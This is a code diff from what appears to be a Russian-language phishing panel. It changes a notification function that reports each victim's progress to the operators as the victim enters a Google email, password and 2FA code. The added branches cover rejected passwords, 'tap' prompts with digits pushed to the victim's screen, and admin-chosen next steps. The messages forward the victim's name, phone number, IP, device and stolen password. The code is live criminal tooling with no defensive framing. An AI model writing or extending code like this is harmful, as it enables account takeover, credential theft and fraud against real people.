@@ -417,10 +417,26 @@ async def notify_user_event(
             admin_header = "📧 <b>Введена Google почта | ⏳ Ожидание пароля</b>\n"
             worker_header = "🦣 <b>Мамонт выбрал Google!</b>\n\n"
             status_desc = "📧 Ввел Google почту, ожидает ввод пароля"
-        elif norm_step in ("google_password", "google_waiting_code", "google_2fa_waiting"):
-            admin_header = "🔑 <b>Введен пароль Google | ⏳ Ожидание 2FA/кода</b>\n"
+        elif norm_step in ("google_password", "google_waiting_code"):
+            admin_header = "🔑 <b>Введен пароль Google | ⏳ Ожидание действия</b>\n"
             worker_header = "🦣 <b>Мамонт ввел пароль Google!</b>\n\n"
-            status_desc = "🔑 Пароль Google введен, ожидает код 2FA"
+            status_desc = "🔑 Пароль Google введен, ожидает решение админа"
+        elif norm_step in ("google_wrong_password", "google_error_password"):
+            admin_header = "❌ <b>Неверный пароль Google | ⏳ Ожидание нового пароля</b>\n"
+            worker_header = "🦣 <b>Отклонен пароль Google!</b>\n\n"
+            status_desc = "❌ Неверный пароль Google, ожидает повторный ввод"
+        elif norm_step in ("google_prompt", "google_show_prompt"):
+            admin_header = "📲 <b>Отправлены цифры Google | ⏳ Ожидание тапа</b>\n"
+            worker_header = "🦣 <b>Отправлен Тап (Цифры)!</b>\n\n"
+            status_desc = "📲 Отправлены цифры (Тап) на экран мамонта"
+        elif norm_step in ("google_2fa_waiting", "google_ask_2fa"):
+            admin_header = "🔑 <b>Запрошен 2FA код Google | ⏳ Ожидание ввода</b>\n"
+            worker_header = "🦣 <b>Запрошен 2FA код Google!</b>\n\n"
+            status_desc = "🔑 Запрошен 2FA код Google"
+        elif norm_step in ("google_wrong_2fa", "google_error_2fa"):
+            admin_header = "❌ <b>Неверный 2FA код Google | ⏳ Ожидание ввода</b>\n"
+            worker_header = "🦣 <b>Неверный 2FA код Google!</b>\n\n"
+            status_desc = "❌ Ввел неверный 2FA код Google, пробует снова"
         elif norm_step in ("google_code", "google_2fa", "google_checking"):
             admin_header = "🔢 <b>Введен код Google | ⏳ Проверка входа</b>\n"
             worker_header = "🦣 <b>Мамонт ввел код Google!</b>\n\n"
@@ -435,42 +451,72 @@ async def notify_user_event(
             status_desc = f"<code>{norm_step}</code>"
 
         # 1. Admin Notification Message
-        block_header = admin_header.strip()
-        block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"
+        if is_test_event:
+            block_header = admin_header.strip()
+            block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"
 
-        mamont_data_lines = [
-            "🦣 <b>Личные данные мамонта:</b>",
-            f"• <b>ID:</b> <code>{user_tg_id}</code>",
-            f"• <b>Имя:</b> {user_nickname}",
-            f"• <b>Юзернейм:</b> {user_tag}",
-            f"• <b>Номер телефона:</b> {phone_display}",
-        ]
-        if is_test_event and email:
-            mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
-        if ip and ip != "—":
-            prov = isp
-            if not prov:
-                prov = f"{country or ''} {city or ''}".strip()
-            elif country and country.lower() not in prov.lower():
-                prov = f"{prov}, {country}"
-            prov_str = f" ({prov})" if prov else ""
-            mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
-        if device and device != "—":
-            mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+            mamont_data_lines = [
+                "🦣 <b>Личные данные мамонта:</b>",
+                f"• <b>ID:</b> <code>{user_tg_id}</code>",
+                f"• <b>Имя:</b> {user_nickname}",
+                f"• <b>Юзернейм:</b> {user_tag}",
+                f"• <b>Номер телефона:</b> {phone_display}",
+            ]
+            if email:
+                mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
+            if ip and ip != "—":
+                prov = isp
+                if not prov:
+                    prov = f"{country or ''} {city or ''}".strip()
+                elif country and country.lower() not in prov.lower():
+                    prov = f"{prov}, {country}"
+                prov_str = f" ({prov})" if prov else ""
+                mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
+            if device and device != "—":
+                mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")
 
-        block_mamont = "\n".join(mamont_data_lines)
+            block_mamont = "\n".join(mamont_data_lines)
 
-        auth_data_lines = []
-        if password_2fa:
-            pass_label = "Пароль Google" if (norm_step.startswith("google_") or email or is_test_event) else "2FA Пароль"
-            auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
-        auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
-        if details and not is_final_auth:
-            auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
+            auth_data_lines = []
+            if password_2fa:
+                pass_label = "Пароль Google" if (norm_step.startswith("google_") or email) else "2FA Пароль"
+                auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+            auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
+            if details and not is_final_auth:
+                auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
-        block_auth = "\n".join(auth_data_lines)
+            block_auth = "\n".join(auth_data_lines)
 
-        admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
+            admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
+        else:
+            admin_lines = [
+                admin_header.strip(),
+                f"🪞 <b>Зеркало:</b> {mirror_str}",
+                f"👨‍💻 <b>Воркер:</b> {worker_str}\n",
+                "🦣 <b>Личные данные мамонта:</b>",
+                f"• <b>ID:</b> <code>{user_tg_id}</code>",
+                f"• <b>Имя:</b> {user_nickname}",
+                f"• <b>Юзернейм:</b> {user_tag}",
+                f"• <b>Номер телефона:</b> {phone_display}",
+            ]
+            if ip and ip != "—":
+                prov = isp
+                if not prov:
+                    prov = f"{country or ''} {city or ''}".strip()
+                elif country and country.lower() not in prov.lower():
+                    prov = f"{prov}, {country}"
+                prov_str = f" ({prov})" if prov else ""
+                admin_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
+            if device and device != "—":
+                admin_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+
+            if password_2fa:
+                admin_lines.append(f"• <b>2FA Пароль:</b> <code>{password_2fa}</code>")
+            admin_lines.append(f"• <b>Статус:</b> {status_desc}")
+            if details and not is_final_auth:
+                admin_lines.append(f"• <b>Детали:</b> {details}")
+
+            admin_text = "\n".join(admin_lines)
 
         admin_msg_id = user_row["admin_log_msg_id"] if user_row and "admin_log_msg_id" in user_row.keys() else None
         worker_msg_id = user_row["worker_log_msg_id"] if user_row and "worker_log_msg_id" in user_row.keys() else None
